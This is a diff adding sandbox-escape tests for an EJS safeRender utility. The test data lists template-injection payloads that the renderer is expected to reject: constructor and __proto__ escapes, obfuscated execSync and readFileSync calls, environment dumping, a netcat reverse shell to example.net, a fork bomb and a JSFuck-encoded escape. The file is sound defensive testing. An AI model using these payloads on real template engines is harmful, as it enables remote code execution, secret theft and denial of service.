@@ -1,12 +1,117 @@
-import { describe, expect, it } from 'vitest';
+import { describe, it, expect } from 'vitest';
 import fs from 'node:fs/promises';
 import { fileURLToPath } from 'node:url';
 import ejs from 'ejs';
-import { safeRender } from '../../../src/utils/safeEjs';
 import { safeRender as safeRenderClient } from '../../../src/utils/safeEjs.client';
 import { customEscapeFunction } from '../../../src/utils/safeEjs.worker';
+import { safeName, safeRender, safeReservedPrefix, VerifierIllegalAccessError, VerifierParsingError, VerifierProcessingQuotaExceededError } from '../../../src/utils/safeEjs';
 
 const testFilename = fileURLToPath(import.meta.url);
+
+describe('check safeRender on invalid cases', () => {
+  const data = {
+    user: {
+      name: 'test',
+      getName: () => 'test',
+    },
+  };
+
+  const illegalAccessCases = Object.entries({
+    'unknown context variable': '<%= group %>',
+    'import 1': '<% import fs from "fs" %>',
+    'import 2': '<% const fs = import("fs") %>',
+    'require 1': '<% const fs = require("fs") %>',
+    '__proto__ access 1': '<%= user.__proto__ %>',
+    '__proto__ access 2': '<%= user?.__proto__ %>',
+    '__proto__ access 3': '<%= user["__proto__"] %>',
+    '__proto__ access 4': '<%= user["__pro" + "to__"] %>',
+    '__proto__ access 5': '<% { __proto__ } = user %>',
+    '__proto__ access 6': '<% var { __proto__ } = user %>',
+    '__proto__ access 7': '<% const { __proto__ } = user %>',
+    '__proto__ access 8': '<% let { __proto__ } = user %>',
+    '__proto__ access 9': '<% { __proto__: test } = user %>',
+    '__proto__ declaration 1': '<% __proto__ = null %>',
+    '__proto__ declaration 2': '<% var __proto__ = null %>',
+    '__proto__ declaration 3': '<% let __proto__ = null %>',
+    '__proto__ declaration 4': '<% const __proto__ = null %>',
+    '__proto__ declaration 5': '<% const o = { __proto__: null } %>',
+    '__proto__ declaration 6': '<% const o = { "__proto__": null } %>',
+    '__proto__ declaration 7': '<% const o = { ["__pr" + "oto__"]: null } %>',
+    '__proto__ declaration 8': '<% const o = { [`__proto__`]: 1 } %>',
+    'safe override 1': `<% ${safeName('property')} = x %>`,
+    'safe override 2': `<% function f(${safeName('Object')}){}  %>`,
+    'safe override 3': `<% const f = (${safeName('statement')}) => {}  %>`,
+    'safe override 4': `<% try { throw 1 } catch(${safeReservedPrefix}xxx){}  %>`,
+    'constructor access 1': '<% ({}).constructor.constructor("")() %>',
+    'constructor access 2': '<% Object["constructor"] %>',
+    'constructor access 3': '<% a["const" + "ructor"] %>',
+    'constructor access 4': '<% a["\u0063onstructor"] %>',
+    'constructor access 5': '<% const { ["constructor"]: c } = {} %>',
+    'constructor access 6': '<% const { ["constr"+"uctor"]: c } = {} %>',
+    'constructor access 7': '<% ({ [`constructor`]: 1 }) %>',
+    'constructor access 8': '<% user.constr\u0075ctor %>',
+    'constructor access 9': '<% ({}).toString.constr\u0075ctor %>',
+    'constructor access 10': '<% (function(){ }).constructor %>',
+    'constructor access 11': '<% (()=>{}).constructor %>',
+    'constructor declaration 1': '<% const o = { \'constr\u0075ctor\': 1 }; %>',
+    'with shadowing 1': `
+      <% with ({ ${safeName('property')}: (x) => x }) { %>
+        <%= user['constructor'] %>
+      <% } %>
+      `,
+    'with shadowing 2': `
+      <% 
+        const o = {};
+        o['____safe____property'] = (x) => x;
+        with (o) { %><%= user['constructor'] %><% }
+      %>
+      `,
+    'with shadowing 3': `
+      <% 
+        const o = { ['____safe____property']: (x) => x };
+        with (o) { %><%= user['constructor'] %><% }
+      %>
+      `,
+    'process exec': '<%= this[\'pro\'+\'cess\'].mainModule[\'requ\'+\'ire\'](\'child_pr\'+\'ocess\')[\'e\'+\'xecSync\'](\'id\')[\'to\'+\'String\']() %>',
+    'file read': '<%= this[\'pro\'+\'cess\'].mainModule[\'requ\'+\'ire\'](\'fs\')[\'read\'+\'FileSync\'](\'/etc/hosts\')[\'to\'+\'String\']() %>',
+    'environment var': '<%= JSON.stringify(this[\'pro\'+\'cess\'][\'en\'+\'v\']) %>',
+    'network access': '<%= this[\'pro\'+\'cess\'].mainModule[\'requ\'+\'ire\'](\'child_pr\'+\'ocess\')[\'sp\'+\'awn\'](\'/bin/sh\', [\'-c\', \'nc example.net 4444 -e /bin/sh\']) %>',
+    'high cpu usage': '<%= this[\'pro\'+\'cess\'].mainModule[\'requ\'+\'ire\'](\'child_pr\'+\'ocess\')[\'e\'+\'xec\'](\':(){ :|:& };:\') %>',
+    'JSFuck encoded': '<% [][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]) %>',
+  }).map(([name, template]) => ({ name, template }));
+
+  it.each(illegalAccessCases)('safeRender should fail with VerifierIllegalAccessError for "$name" case', ({ template }) => {
+    expect(() => safeRender(template, data)).toThrowError(VerifierIllegalAccessError);
+  });
+
+  const processingQuotaExceededCases = Object.entries({
+    'high cpu usage': `
+        <% while(true) {
+           // Infinite loop consuming CPU
+           Math.random() * Math.random();
+        } %>
+      `,
+  }).map(([name, template]) => ({ name, template }));
+
+  it.each(processingQuotaExceededCases)('safeRender should fail with VerifierProcessingQuotaExceededError for "$name" case', ({ template }) => {
+    expect(() => safeRender(template, data, { maxExecutedStatementCount: 1000 })).toThrowError(VerifierProcessingQuotaExceededError);
+    expect(() => safeRender(template, data, { maxExecutionDuration: 100 })).toThrowError(VerifierProcessingQuotaExceededError);
+  });
+
+  const parsingErrorCases = Object.entries({
+    'invalid EJS': ' <%= ',
+    'invalid JS': ' <%= user( %>',
+  }).map(([name, template]) => ({ name, template }));
+
+  it.each(parsingErrorCases)('safeRender should fail with VerifierParsingError for "$name" case', ({ template }) => {
+    expect(() => safeRender(template, data)).toThrowError(VerifierParsingError);
+  });
+
+  it('safeRender should fail with VerifierIllegalAccessError for invalid context', () => {
+    expect(() => safeRender('', { eval: 1 })).toThrowError(VerifierIllegalAccessError);
+    expect(() => safeRender('<% Object.assign({}, user) %>', { user: { freeze: 1 } })).toThrowError(VerifierIllegalAccessError);
+  });
+});
 
 describe('check safeRender on valid cases', () => {
   const data = {
